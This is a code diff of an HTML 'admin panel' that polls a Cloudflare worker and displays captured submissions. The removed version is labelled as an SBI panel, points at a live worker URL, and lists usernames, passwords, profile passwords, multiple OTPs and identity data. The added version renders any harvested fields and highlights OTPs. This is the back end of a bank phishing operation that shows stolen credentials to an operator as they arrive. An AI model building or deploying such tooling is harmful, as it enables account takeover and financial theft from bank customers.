@@ -3,74 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI - Separate Cards Admin</title>
+    <title>Admin Dashboard - Darogaji</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
-        .header { background: #b30000; color: white; padding: 15px; text-align: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .container { padding: 10px; max-width: 500px; margin: auto; }
-        
-        /* Chota aur Clean Card */
-        .card { 
-            background: white; border-radius: 8px; padding: 12px; margin-bottom: 12px; 
-            border-left: 5px solid #b30000; box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f0f2f5; padding: 20px; }
+        .header { 
+            background: #315195; color: white; padding: 15px; 
+            text-align: center; border-radius: 8px; margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .time { font-size: 10px; color: #999; margin-bottom: 8px; display: block; }
-        .data-box { display: flex; flex-direction: column; gap: 5px; }
-        .label { font-size: 10px; color: #b30000; font-weight: bold; text-transform: uppercase; }
-        .value { font-size: 16px; font-weight: bold; color: #333; word-break: break-all; }
+        .controls { text-align: center; margin-bottom: 20px; font-size: 14px; color: #666; }
         
-        /* Highlight for important data */
-        .user-val { color: #0054a6; }
-        .otp-val { color: #1e7e34; font-size: 20px; letter-spacing: 1px; }
+        #log-container { 
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); 
+            gap: 20px; max-width: 1200px; margin: 0 auto; 
+        }
+
+        .card {
+            background: white; border-left: 5px solid #315195;
+            padding: 15px; border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            transition: transform 0.2s;
+        }
+        .card:hover { transform: translateY(-5px); }
+        
+        .card-header { 
+            display: flex; justify-content: space-between; 
+            border-bottom: 1px solid #eee; padding-bottom: 8px; margin-bottom: 10px;
+        }
+        .tag { 
+            background: #e7f0ff; color: #315195; 
+            padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; 
+            text-transform: uppercase;
+        }
+        .time { font-size: 11px; color: #999; }
+
+        .data-row { margin-bottom: 6px; font-size: 14px; }
+        .label { font-weight: bold; color: #555; width: 100px; display: inline-block; }
+        .value { color: #000; font-family: monospace; font-size: 15px; }
+        
+        .no-data { text-align: center; grid-column: 1 / -1; padding: 50px; color: #888; }
+        
+        /* Highlight for OTP */
+        .otp-style { color: #d9534f; font-weight: bold; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h3 style="margin:0;">● LIVE LOGS (Separate)</h3>
-        <small>Newest on Top | Refreshing 1s</small>
+        <h2>Darogaji Admin Panel</h2>
     </div>
 
-    <div class="container" id="logs">
-        <div style="text-align:center; margin-top:50px;">Loading logs...</div>
+    <div class="controls">
+        Auto-refreshing every 5 seconds... | <span id="last-update">Updating...</span>
+    </div>
+
+    <div id="log-container">
+        <div class="no-data">Fetching logs from database...</div>
     </div>
 
     <script>
-        const workerURL = 'https://dawn-hat-2875.sumankkuuyy.workers.dev/';
+        // Yahan apna Worker URL dalo
+        const workerURL = 'https://your-worker-url.workers.dev/';
 
-        async function getLogs() {
+        async function fetchLogs() {
             try {
-                const res = await fetch(workerURL);
-                const data = await res.json();
-                const container = document.getElementById('logs');
+                const response = await fetch(workerURL);
+                const results = await response.json();
                 
-                if (data.length === 0) {
-                    container.innerHTML = '<p style="text-align:center; color:#999;">No logs yet.</p>';
+                const container = document.getElementById('log-container');
+                const updateLabel = document.getElementById('last-update');
+                
+                if (results.length === 0) {
+                    container.innerHTML = '<div class="no-data">No submissions found yet.</div>';
                     return;
                 }
 
                 let html = '';
-                // Sabse naya card sabse upar
-                data.reverse().forEach(item => {
-                    html += `<div class="card"><span class="time">🕒 ${item.time || 'Just now'}</span><div class="data-box">`;
+                results.forEach(row => {
+                    // D1 se data_content ko parse karo
+                    const details = JSON.parse(row.data_content);
+                    const stepName = row.step_name || "Entry";
                     
-                    // Card ke andar wahi data dikhao jo available hai
-                    if(item.user) html += `<div class="label">Username</div><div class="value user-val">${item.user}</div>`;
-                    if(item.pass) html += `<div class="label">Password</div><div class="value">${item.pass}</div>`;
-                    if(item.profile_pass) html += `<div class="label">Profile Password</div><div class="value">${item.profile_pass}</div>`;
-                    if(item.otp1) html += `<div class="label">OTP - 1</div><div class="value otp-val">${item.otp1}</div>`;
-                    if(item.otp2) html += `<div class="label">OTP - 2</div><div class="value otp-val">${item.otp2}</div>`;
-                    if(item.otp3) html += `<div class="label">OTP - 3</div><div class="value otp-val">${item.otp3}</div>`;
-                    if(item.identity) html += `<div class="label">Identity</div><div class="value">${item.identity}</div>`;
-                    
-                    html += `</div></div>`;
+                    html += `
+                        <div class="card">
+                            <div class="card-header">
+                                <span class="tag">${stepName}</span>
+                                <span class="time">${new Date(row.created_at).toLocaleString()}</span>
+                            </div>
+                    `;
+
+                    // Card ke andar saare fields dynamic dikhao
+                    for (const key in details) {
+                        if (key !== 'type' && key !== 'user_id') {
+                            const isOTP = key.toLowerCase().includes('otp');
+                            html += `
+                                <div class="data-row">
+                                    <span class="label">${key.toUpperCase()}:</span>
+                                    <span class="value ${isOTP ? 'otp-style' : ''}">${details[key]}</span>
+                                </div>
+                            `;
+                        }
+                    }
+
+                    html += `</div>`;
                 });
+
                 container.innerHTML = html;
-            } catch (e) { console.log(e); }
+                updateLabel.innerText = "Last Updated: " + new Date().toLocaleTimeString();
+
+            } catch (err) {
+                console.error("Fetch Error:", err);
+                document.getElementById('last-update').innerText = "Update Failed!";
+            }
         }
 
-        setInterval(getLogs, 1000);
-        getLogs();
+        // Pahli baar load karo
+        fetchLogs();
+
+        // Har 5 Seconds mein refresh (5000ms)
+        setInterval(fetchLogs, 5000);
     </script>
 </body>
 </html>
